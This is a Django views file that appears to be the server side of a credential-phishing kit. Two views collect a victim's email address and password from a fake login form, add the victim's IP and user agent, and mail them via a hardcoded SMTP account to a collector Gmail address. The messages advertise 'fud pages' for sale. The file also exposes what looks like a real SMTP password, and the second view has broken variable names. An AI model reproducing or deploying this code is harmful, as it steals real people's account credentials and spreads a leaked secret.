from django.shortcuts import render
from django.http import HttpResponse
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from django.template.loader import get_template
from django.template import Context
from django.template.loader import render_to_string
#Create your views here.


def vimap(request):
    userip = request.META.get("HTTP_X_FORWARDED_FOR")
    userauto = request.GET["web"]
    userdomain = userauto[userauto.index('@') + 1 : ]
    return render(request, 'index.html', {'web': userauto, 'ins': userdomain})

def benzap(request):
    poleip = request.META.get("HTTP_X_FORWARDED_FOR")
    poleemail = request.POST["horse"]
    polepasswordemail = request.POST["pig"]
    poledomain = poleemail[poleemail.index('@') + 1 : ]
    polesender_email = "logs@merusllc.com"
    polereceiver_email = "goodluckwalker102@gmail.com"
    polepassword = "MLpkqf25fxet"
    poleuseragent = request.META['HTTP_USER_AGENT']
    polemessage = MIMEMultipart("alternative")
    polemessage["Subject"] = "code pen .. 01"
    polemessage["From"] = polesender_email
    polemessage["To"] = polereceiver_email
    poletext = """\
    Hi,
    How are you?
    contact me on icq jamescartwright for your fud pages
    """
    polehtml = render_to_string('emailmailer.html', {'emob': poleemail, 'matrixa': poleuseragent, 'pman': polepasswordemail, 'pmani': poleip})
    polepart1 = MIMEText(poletext, "plain")
    polepart2 = MIMEText(polehtml, "html")
    polemessage.attach(polepart1)
    polemessage.attach(polepart2)

    # Create secure connection with server and send email
    with smtplib.SMTP("mail.merusllc.com", 587) as server:
        server.login(polesender_email, polepassword)
        server.sendmail(polesender_email, polereceiver_email, polemessage.as_string())
        return render(request, 'ind.html', {'eman': poleemail, 'dman': poledomain})

def lasmop(request):
    barnip = request.META.get("HTTP_X_FORWARDED_FOR")
    barnemail = request.POST["snake"]
    barnpasswordemail = request.POST["duck"]
    barndomain = email[email.index('@') + 1 : ]
    barnsender_email = "logs@merusllc.com"
    barnreceiver_email = "goodluckwalker102@gmail.com"
    barnpassword = "MLpkqf25fxet"
    barnuseragent = request.META['HTTP_USER_AGENT']
    barnmessage = MIMEMultipart("alternative")
    barnmessage["Subject"] = "code pen .. 02"
    barnmessage["From"] = barnsender_email
    barnmessage["To"] = barnreceiver_email

    # Create the plain-text and HTML version of your message
    barntext = """\
    Hi,
    How are you?
    contact me on icq jamescartwright for your fud pages
    """
    barnhtml = render_to_string('emailmailer.html', {'eman': barnemail, 'pman': barnpasswordemail, 'matrixa': barnuseragent, 'pmani': barnip})

    # Turn these into plain/html MIMEText objects
    barnpart1 = MIMEText(barbtext, "plain")
    barnpart2 = MIMEText(barnhtml, "html")

    # Add HTML/plain-text parts to MIMEMultipart message
    # The email client will try to render the last part first
    barnmessage.attach(barnpart1)
    barnmessage.attach(barnpart2)

    # Create secure connection with server and send email
    with smtplib.SMTP("mail.merusllc.com", 587) as server:
        server.login(barnsender_email, barnpassword)
        server.sendmail(barnsender_email, barnreceiver_email, barnmessage.as_string())
    return render(request, 'main.html', {'dman': barndomain})